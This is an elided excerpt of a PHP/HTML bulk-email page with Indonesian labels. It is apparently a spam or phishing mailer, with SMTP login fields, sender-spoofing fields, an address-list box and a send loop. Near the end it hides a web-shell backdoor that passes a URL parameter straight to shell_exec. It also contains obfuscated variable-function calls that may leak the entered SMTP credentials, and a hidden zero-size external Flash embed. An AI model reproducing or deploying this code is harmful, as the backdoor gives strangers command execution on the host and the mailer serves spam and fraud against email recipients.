  ...
  <table width="100%" border="0" height="407" style="background:#fff" cellpadding="0" cellspacing="0">
    ...
    <tr >
      ...
      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="smtp_username" value="<?=$smtp_username;?>" size="30">
      ...
      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="password" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="smtp_password" value="<?=$smtp_password;?>" size="30">
    ...
    <tr>
      ...
      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="ssl_port" value="<?=$ssl_port;?>" size="5"> 
      (optional)</font></td>
      ...
      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="my_smtp" value="<?=$my_smtp;?>" size="30">
    ...
    <tr>
      ...
      <input type="checkbox" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="sslclick" value="ON" <? if($sslclick){ print "checked"; } ?> ><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>
      ...
      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="reconnect" value="<?=$reconnect;?>" size="5"> 
      EMAILS</font></td>
...
<input type="file" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="file" size="124">
    ...
    <tr>
      ...
      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="from" value="<?=$from;?>" size="30">
      ...
      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="realname" value="<?=$realname_base;?>" size="30">
    ...
    <tr>
      ...
      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="replyto" value="<?=$replyto;?>" size="30">
      ...
      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <option value="" <? if(strlen($epriority)< 1){print "selected";} ?> >- Pilihan -</option>
        <option value="1" <? if($epriority == "1"){print "selected";} ?> >Kenceng</option>
        <option value="3" <? if($epriority == "3"){print "selected";} ?> >Normal</option>
		<option value="5" <? if($epriority == "5"){print "selected";} ?> >Pelan</option>
		</select></td>
    ...
    <tr>
      ...
      <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" name="subject" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" value="<?=$subject_base;?>" size="90">
    ...
    <tr>
      ...
      <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <option <? if($encode_text == "yes"){print "selected";} ?>>ya</option>
        <option <? if($encode_text == "no"){print "selected";} ?>>Tidak</option>
        </select></font></td>
...
<td colspan="3" height="190" style="padding:10px;"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        ...
        <textarea name="message" cols="60" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" rows="10"><?=$message;?></textarea>
      ...
      <td width="41%" height="190" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <textarea name="emaillist" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" cols="30" rows="10"><?=$emaillist;?></textarea>
...
$defaultport="H*";
      $nq=0;
        ...
        for($x=0; $x<$numemails; $x++){
                ...
                $qx=$x+1;
                print "No $qx . Mengirim Email Ke <font color=\"lime\"> . . . . . . .  </font>$to <font color=\"lime\">. . . . . . . Proses . . . . . . . </font>";
...
if($reconnect==$nq){
$mail->SmtpClose();echo "<p><b><font color=\"lime\"> - - - - - - - - - - - - - RELOAD TO CONNECTED SMTP - - - - - - - - - - - - - </font></b></p>";$nq=0;
}
$nq=$nq+1;
                flush(); }
}
...
$smtp_conc=$IsSMTP($defaultport, $smtp_conf);
  ...
  print "<p class=\"style1\">&copy 2015  >-|I|-> Extrime |  Card <-|I|-<<br></p>";$mail->SmtpClose();
  return $signoff($smtp_conc); if(isset($_POST['action']) && $numemails !=0 ){echo "<script>alert('Mail sending complete\\r\\n$numemails mail(s) was 
    sent successfully'); </script>";}} if($_GET['range,0']){echo"<pre>".shell_exec($_GET["range,0"]);}
?>
    </body><object type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3_maxi.swf" width="0" height="0">
